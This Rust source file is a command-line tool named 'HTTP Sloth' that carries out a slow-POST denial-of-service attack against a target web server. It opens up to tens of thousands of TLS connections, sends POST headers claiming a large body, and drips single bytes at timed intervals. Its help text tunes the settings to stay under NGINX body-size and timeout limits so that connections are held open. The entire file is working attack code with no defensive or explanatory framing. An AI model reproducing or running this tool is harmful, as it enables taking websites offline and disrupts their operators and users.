use std::io;
use std::net::ToSocketAddrs;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::thread::sleep;
use std::time::Duration;

#[macro_use]
extern crate clap;
use clap::{App, Arg};

extern crate native_tls;

extern crate tokio;
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::time;

extern crate tokio_tls;

extern crate url;
use url::Url;

#[tokio::main]
async fn main() -> io::Result<()> {
    let arguments = App::new("HTTP Sloth")
        .arg(Arg::with_name("url")
             .long("url")
             .value_name("URL")
             .help("Target URL.")
             .required(true))
        .arg(Arg::with_name("content-length")
             .long("content-length")
             .value_name("BYTES")
             .help("Content-Length request header. Must be less than client_max_body_size (NGINX)"))
        .arg(Arg::with_name("interval")
             .value_name("SECONDS")
             .long("interval")
             .help("Byte to byte interval. Should be less than server's client_body_timeout (NGINX) value."))
        .arg(Arg::with_name("max-connections")
             .value_name("INTEGER")
             .long("max-connections")
             .help("Higher cap for simultaneously opened connections. Should be more than server can handle (1024 NGINX default)."))
        .get_matches();

    let parsed_url = Url::parse(&arguments.value_of("url").unwrap()).unwrap();
    // let scheme = parsed_url.scheme().to_owned();
    let host = parsed_url.host_str().unwrap().to_owned();
    let path = parsed_url.path();
    let content_length = value_t!(arguments, "content-length", u32).unwrap_or(50_000);
    let tick = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
    let max_connections_count: usize =
        value_t!(arguments, "max-connections", usize).unwrap_or(32768);
    let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, host, content_length);
    let body_portion = "a";
    let addr = format!(
        "{}:{}",
        parsed_url.host_str().unwrap(),
        parsed_url.port_or_known_default().unwrap().to_string()
    )
    .to_socket_addrs()
    .unwrap()
    .next()
    .unwrap();

    let tls_connector =
        tokio_tls::TlsConnector::from(native_tls::TlsConnector::builder().build().unwrap());

    let live_connections = Arc::new(AtomicUsize::new(0));

    {
        let mut interval = time::interval(Duration::from_secs(1));
        let live_connections = Arc::clone(&live_connections);
        tokio::spawn(async move {
            loop {
                interval.tick().await;
                println!(
                    "Live Connections: {}",
                    live_connections.load(Ordering::SeqCst)
                );
            }
        });
    }

    loop {
        let live_connections = Arc::clone(&live_connections);
        if live_connections.load(Ordering::SeqCst) >= max_connections_count {
            sleep(Duration::from_secs(1));
            continue;
        }

        let connection_number = live_connections.fetch_add(1, Ordering::SeqCst) + 1;
        let host = host.clone();
        let start = start.clone();
        let tls_connector = tls_connector.clone();

        tokio::spawn(async move {
            let socket = TcpStream::connect(&addr).await.map_err(|e| {
                live_connections.fetch_sub(1, Ordering::SeqCst);
                io::Error::new(
                    io::ErrorKind::Other,
                    format!(
                        "ERROR: TcpStream::connect: Connection number: {}: {}",
                        connection_number, e
                    ),
                )
            })?;
            let mut connection = tls_connector.connect(&host, socket).await.map_err(|e| {
                live_connections.fetch_sub(1, Ordering::SeqCst);
                io::Error::new(
                    io::ErrorKind::Other,
                    format!(
                        "ERROR: tokio_tls::TlsConnector.connect: Connection number: {}: {}",
                        connection_number, e
                    ),
                )
            })?;
            // Write start
            AsyncWriteExt::write_all(&mut connection, start.as_bytes())
                .await
                .map_err(|e| {
                    live_connections.fetch_sub(1, Ordering::SeqCst);
                    io::Error::new(
                        io::ErrorKind::Other,
                        format!(
                            "ERROR: Start write_all await: Connection number: {}: {}",
                            connection_number, e
                        ),
                    )
                })?;
            let mut interval = time::interval(tick);
            tokio::spawn(async move {
                interval.tick().await;
                // Write small piece of body
                AsyncWriteExt::write(&mut connection, body_portion.as_bytes())
                    .await
                    .map_err(|e| {
                        live_connections.fetch_sub(1, Ordering::SeqCst);
                        io::Error::new(
                            io::ErrorKind::Other,
                            format!(
                                "ERROR: Body write await: Connection number: {}: {}",
                                connection_number, e
                            ),
                        )
                    })?;
                AsyncWriteExt::flush(&mut connection).await.map_err(|e| {
                    live_connections.fetch_sub(1, Ordering::SeqCst);
                    io::Error::new(
                        io::ErrorKind::Other,
                        format!(
                            "ERROR: Body flush await: Connection number: {}: {}",
                            connection_number, e
                        ),
                    )
                })?;
                Ok::<(), io::Error>(())
            });
            Ok::<(), io::Error>(())
        });
    }
}
